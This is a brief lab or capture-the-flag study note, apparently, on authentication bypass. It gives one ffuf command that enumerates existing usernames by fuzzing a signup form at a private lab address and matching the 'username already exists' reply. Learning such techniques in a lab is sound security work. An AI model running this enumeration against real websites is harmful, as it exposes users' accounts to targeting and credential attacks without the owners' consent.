### Authentication Bypass

---

To find the existing users on a webpage

```py
ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt 
-X POST -d "username=FUZZ&email=x&password=x&cpassword=x" 
-H "Content-Type: application/x-www-form-urlencoded" -u 
http://10.10.54.208/customers/signup -mr "username already exists"
```

